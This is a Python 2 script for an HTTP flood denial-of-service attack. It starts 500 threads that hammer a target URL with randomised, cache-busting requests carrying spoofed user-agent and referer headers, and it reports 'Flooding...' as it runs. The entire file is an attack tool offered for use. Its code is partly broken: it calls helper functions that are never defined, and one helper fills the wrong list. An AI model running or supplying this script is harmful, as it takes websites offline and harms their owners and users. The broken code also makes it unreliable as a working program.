import urllib2
import sys
import threading
import random
import re


url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0

def inc_counter():
	global request_counter
	request_counter+=1

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1
def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
	return(headers_referers)

W  = "\033[0m";
R  = "\033[31m";
G  = "\033[32m";
O  = "\033[33m";
B  = "\033[34m";

#builds random ascii string
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)





#http request
def httpcall(url):
	useragent_list()
	referer_list()
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)

	except urllib2.URLError, e:

			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)



class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
		except Exception, ex:
			pass


class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				print "\x1b[0;31m[ \x1b[1;37m+\x1b[0;31m ]Flooding...\x1b[0;31m"
				previous=request_counter
		if flag==2:
			print "\n \x1b[0;31m[ \x1b[1;37m+\x1b[0;31m ]Stopping Flood.\x1b[0;31m"


if len(sys.argv) < 2:
	sys.exit()
else:
	if sys.argv[1]=="help":
		sys.exit()
	else:
		print "\x1b[0;31m[ \x1b[1;37m+\x1b[0;31m ]Starting HTTP Flood !\x1b[0;31m "
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
		if url.count("/")==2:
			url = url + "/"
		m = re.search('http\://([^/]*)/?.*', url)
		host = m.group(1)
		for i in range(500):
			t = HTTPThread()
			t.start()
		t = MonitorThread()
		t.start()




